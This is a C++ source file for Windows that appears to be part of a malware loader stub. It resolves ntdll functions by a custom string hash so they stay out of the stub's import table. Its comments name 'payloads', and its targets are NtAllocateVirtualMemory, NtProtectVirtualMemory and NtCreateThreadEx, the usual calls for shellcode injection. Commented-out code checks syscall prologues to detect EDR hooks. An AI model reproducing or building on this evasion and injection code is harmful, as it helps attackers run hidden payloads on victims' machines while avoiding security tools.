#include "resolve.h"
#include <iomanip>

DWORD getHashFromString(const char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}
void* resolve_addr(HMODULE hModule, const char* name, DWORD hash){
    auto dos_header = (PIMAGE_DOS_HEADER)hModule;
    auto nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos_header->e_lfanew);
    auto export_dir_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_dir_rva);
    auto num = export_dir->NumberOfFunctions;

    auto names = (DWORD*)((BYTE*)hModule + export_dir->AddressOfNames);
    auto functions = (DWORD*)((BYTE*)hModule + export_dir->AddressOfFunctions);
    auto ordinals = (WORD*)((BYTE*)hModule + export_dir->AddressOfNameOrdinals);

    unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };

    for(DWORD i  = 0; i < export_dir->NumberOfNames; i++){
        const char *fn_name = (const char*)hModule + names[i];

        // Resolve by name, for the payloads imports that need to be resolved
        if(name && strcmp(fn_name, name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD fn_rva = functions[ordinal];
            return ((BYTE*)hModule + fn_rva);
        }
        // Resolve by hash, for functions that should not be in the stubs IAT
        if(!name){
            DWORD fn_hashed = getHashFromString(fn_name);
            if(fn_hashed == hash){
                WORD ordinal = ordinals[i];
                DWORD fn_rva = functions[ordinal];
                printf("Function: %s (hash: %u) resolved at: %p\n", fn_name, fn_hashed, ((BYTE*)hModule + fn_rva));
                /*
                if(strcmp(fn_name, "NtAllocateVirtualMemory") == 0 || strcmp(fn_name, "NtCreateThreadEx") == 0 || strcmp(fn_name, "NtProtectVirtualMemory") == 0){
                    std::cout << "Prologue for " << fn_name << std::endl;
                    for(uint16_t j = 0; j < 12; j++){
                        std::cout << "0x" 
                        << std::hex << std::setw(2) << std::setfill('0')  // Format to 2-digit hex
                        << static_cast<int>(*((BYTE*)hModule + fn_rva + j)) 
                        << " ";
                    }
                    std::cout << std::endl;

                    if(!memcmp(((BYTE*)hModule + fn_rva), syscallPrologue, 4)){
                        std::cout << fn_name << " hooked" << std::endl;
                    }
                    
                }*/

                return ((BYTE*)hModule + fn_rva);
            }
        }

    }
    std::cout << "Failed to resolve address for:\nHash:" << hash << "\nname:" << name << std::endl;
    return nullptr;
}
void resolve_func_pointers(DWORD *hashes, HMODULE handle){
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)resolve_addr(handle, 0, hashes[0]);
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)resolve_addr(handle, 0, hashes[1]);
    pNtCreateThreadEx = (NtCreateThreadEx_t)resolve_addr(handle, 0, hashes[2]);

    /*
    void* realLLA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    void* realVA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    void* realCT = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    printf("[+] pNtAllocateVirtualMemory: %p : %p\n", pNtAllocateVirtualMemory, realLLA);
    printf("[+] pNtProtectVirtualMemory: %p : %p\n", pNtProtectVirtualMemory, realVA);
    printf("[+] pNtCreateThreadEx: %p : %p\n", pNtCreateThreadEx, realCT);
    */
}

